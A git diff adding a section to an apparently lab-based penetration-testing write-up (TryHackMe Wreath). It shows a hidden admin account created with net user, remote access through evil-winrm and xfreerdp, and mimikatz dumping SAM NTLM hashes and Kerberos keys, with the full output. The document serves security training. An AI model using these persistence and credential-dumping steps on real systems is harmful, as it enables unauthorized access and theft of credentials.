@@ -1595,4 +1595,126 @@ Everything else is the same as the sshuttle
 <details>
   <summary>---</summary>
 
+We know two ports are open on target `.150` - 3389 (RDP) and 5985 (WinRM)
+
+We need a user account (rather than service account) with:
+- `Remote Desktop Users` group for RDP (`Administrators` group trumps the RDP group)
+- `Remote Management Users` group for WinRM. 
+
+Since we already have ultimate access, we can create these accounts
+
+1. Create the account `net user USERNAME PASSWORD /add`
+2. Add account in the Administrators and Remote Management Users groups `net localgroup Administrators USERNAME /add` and `net localgroup "Remote Management Users" USERNAME /add`
+
+```
+PS C:\GitStack\gitphp> net user Neozer0 taco /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup Administrators Neozer0 /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup "Remote Management Users" Neozer0 /add
+The command completed successfully.
+```
+
+Confirm user and groups
+```
+PS C:\GitStack\gitphp> net user Neozer0
+User name                    Neozer0
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            17/04/2021 12:44:07
+Password expires             Never
+Password changeable          17/04/2021 12:44:07
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+```
+
+We can now access this box with new user login
+
+3. Install winrm `sudo gem install evil-winrm`
+4. Connect to target `evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`
+
+for SSH port forward - a second tunnel needs to be created to access port 5985 - `-i 127.0.0.1 -P 58950`
+
+```
+kali@kali:~/thm/wreath$ evil-winrm -u Neozer0 -p taco -i 10.200.85.150
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Neozer0\Documents> whoami
+git-serv\neozer0
+*Evil-WinRM* PS C:\Users\Neozer0\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes
+============================================================= ================ ============ ==================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
+BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
+
+```
+
+run xfreerdp to get GUI rdp
+```
+kali@kali:~/thm/wreath$ xfreerdp /v:10.200.85.150 /u:Neozer0 /p:taco +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+[03:04:23:067] [2154:2155] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
+[03:04:23:067] [2154:2155] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
+[03:04:23:067] [2154:2155] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
+...
+```
+
+We can see a share folder that can be accessed on cli as `\\tsclient\`
+
+![xfreerdp](xfreerdp-share-folder.png)
+
+run cmd as admin and run mimikatz
+
+We can obtain the hashes by using `lsadump::sam`
+
+```
+(c) 2018 Microsoft Corporation. All rights reserved.                                                                                                                                                                                                                                    C:\Windows\system32>\\tsclient\share\mimikatz\x64\mimikatz.exe                                                                                                                                                                                                                            .#####.   mimikatz 2.2.0 (x64) #18362 Jan  4 2020 18:59:26                                                                                 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                       '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                     '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                                                                                                                                                                                               mimikatz # privilege::debug                                                                                                                 Privilege '20' OK                                                                                                                                                                                                                                                                       mimikatz # token::elevate                                                                                                                   Token Id  : 0                                                                                                                               User name :                                                                                                                                 SID name  : NT AUTHORITY\SYSTEM                                                                                                                                                                                                                                                         672     {0;000003e7} 1 D 20141          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary                                      -> Impersonated !                                                                                                                           * Process Token : {0;000b5d45} 2 F 1722298     GIT-SERV\Neozer0        S-1-5-21-3335744492-1614955177-2693036043-1002  (15g,24p)    Primary                                                                                                                                             * Thread Token  : {0;000003e7} 1 D 1795378     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)                                                                                                                                                      mimikatz # log c:\windows\temp\mimikatz.log                                                                                                 Using 'c:\windows\temp\mimikatz.log' for logfile : OK                                                                                                                                                                                                                                   mimikatz # lsadump::sam                                                                                                                     Domain : GIT-SERV                                                                                                                           SysKey : 0841f6354f4b96d21b99345d07b66571                                                                                                   Local SID : S-1-5-21-3335744492-1614955177-2693036043                                                                                                                                                                                                                                   SAMKey : f4a3c96f8149df966517ec3554632cf4                                                                                                                                                                                                                                               RID  : 000001f4 (500)                                                                                                                       User : Administrator                                                                                                                          Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1                                                                                                                                                                                                                                           Supplemental Credentials:                                                                                                                   * Primary:NTLM-Strong-NTOWF *                                                                                                                   Random Value : 68b1608793104cca229de9f1dfb6fbae
+...
+RID  : 000003e9 (1001)                                                                                                       User : Thomas                                                                                                                  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f                                                                                                                                                                                                             Supplemental Credentials:                                                                                                    * Primary:NTLM-Strong-NTOWF *                                                                                                    Random Value : 03126107c740a83797806c207553cef7                                                                                                                                                                                                       * Primary:Kerberos-Newer-Keys *                                                                                                  Default Salt : GIT-SERVThomas                                                                                                Default Iterations : 4096                                                                                                    Credentials                                                                                                                    aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe                                  aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69                                                                  des_cbc_md5       (4096) : e5add55e76751fbc                                                                                OldCredentials                                                                                                                 aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2                                  aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55                                                                  des_cbc_md5       (4096) : 7f16a47cef890b3b                                                                                                                                                                                                         * Packages *                                                                                                                     NTLM-Strong-NTOWF                                                                                                                                                                                                                                     * Primary:Kerberos *                                                                                                             Default Salt : GIT-SERVThomas                                                                                                Credentials                                                                                                                    des_cbc_md5       : e5add55e76751fbc                                                                                       OldCredentials                                                                                                                 des_cbc_md5       : 7f16a47cef890b3b                                
+
+```
+
+![xfreerdp mimikatz](xfreerdp-mimikatz.png)
+</details>
+
+## 18. Command and Control - Introduction
+
+<details>
+  <summary>---</summary>
+
 </details>
